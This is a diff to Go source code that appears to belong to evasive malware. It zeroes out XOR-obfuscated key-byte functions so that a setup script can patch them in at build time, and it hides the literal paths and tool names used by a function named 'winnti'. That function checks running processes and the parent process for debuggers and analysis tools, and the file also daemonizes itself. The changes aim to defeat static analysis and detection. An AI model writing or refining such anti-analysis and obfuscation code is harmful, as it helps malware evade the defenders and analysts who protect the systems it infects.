@@ -22,22 +22,22 @@ import (
 // operations to make static analysis more difficult. Each returns a single byte.
 // ============================================================================
 
-func mew() byte      { return byte(0xCC ^ 0xA6) }
-func mewtwo() byte   { return byte(0xC3 ^ 0x91) }
-func celebi() byte   { return byte(0x79 ^ 0xC0) }
-func jirachi() byte  { return byte(0x4F ^ 0xAA) }
-func shaymin() byte  { return byte(0x51 ^ 0x80) }
-func phione() byte   { return byte(0x75 ^ 0xD1) }
-func manaphy() byte  { return byte(0x4B ^ 0x7C) }
-func victini() byte  { return byte(0x87 ^ 0x86) }
-func keldeo() byte   { return byte(0xFC ^ 0x7C) }
-func meloetta() byte { return byte(0xD2 ^ 0x54) }
-func genesect() byte { return byte(0xE9 ^ 0xEC) }
-func diancie() byte  { return byte(0x77 ^ 0xF1) }
-func hoopa() byte    { return byte(0x3B ^ 0x4C) }
-func volcanion() byte { return byte(0x3C ^ 0x9D) }
-func magearna() byte { return byte(0x6C ^ 0x3C) }
-func marshadow() byte { return byte(0x97 ^ 0x33) }
+func mew() byte      { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func mewtwo() byte   { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func celebi() byte   { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func jirachi() byte  { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func shaymin() byte  { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func phione() byte   { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func manaphy() byte  { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func victini() byte  { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func keldeo() byte   { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func meloetta() byte { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func genesect() byte { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func diancie() byte  { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func hoopa() byte    { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func volcanion() byte { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func magearna() byte { return byte(0x00 ^ 0x00) }  // patched by setup.py
+func marshadow() byte { return byte(0x00 ^ 0x00) }  // patched by setup.py
 
 // ============================================================================
 // CRYPTOGRAPHIC FUNCTIONS
@@ -174,7 +174,7 @@ func winnti() bool {
 			if _, err := strconv.Atoi(proc.Name()); err != nil {
 				continue
 			}
-			if cmdline, err := os.ReadFile("/proc/" + proc.Name() + "/cmdline"); err == nil {
+			if cmdline, err := os.ReadFile(procPrefix + proc.Name() + cmdlineSuffix); err == nil {
 				cmdStr := strings.ToLower(string(cmdline))
 				for _, indicator := range sysMarkers {
 					if strings.Contains(cmdStr, indicator) {
@@ -186,7 +186,7 @@ func winnti() bool {
 	}
 	for _, tool := range procFilters {
 		if _, err := os.Stat(tool); err == nil {
-			if out, err := exec.Command("pgrep", "-f", filepath.Base(tool)).Output(); err == nil {
+			if out, err := exec.Command(pgrepBin, pgrepFlag, filepath.Base(tool)).Output(); err == nil {
 				if len(strings.TrimSpace(string(out))) > 0 {
 					return true
 				}
@@ -194,7 +194,7 @@ func winnti() bool {
 		}
 	}
 	if ppid := os.Getppid(); ppid > 1 {
-		if cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid)); err == nil {
+		if cmdline, err := os.ReadFile(fmt.Sprintf(procPrefix+"%d"+cmdlineSuffix, ppid)); err == nil {
 			parentCmd := strings.ToLower(string(cmdline))
 			for _, debugger := range parentChecks {
 				if strings.Contains(parentCmd, debugger) {
@@ -309,7 +309,7 @@ func daemonHousekeep() {
 // devNull opens /dev/null with the requested flags and returns the fd.
 // Returns -1 on failure.
 func devNull(flag int) int {
-	fd, err := syscall.Open("/dev/null", flag, 0)
+	fd, err := syscall.Open(devNullPath, flag, 0)
 	if err != nil {
 		return -1
 	}
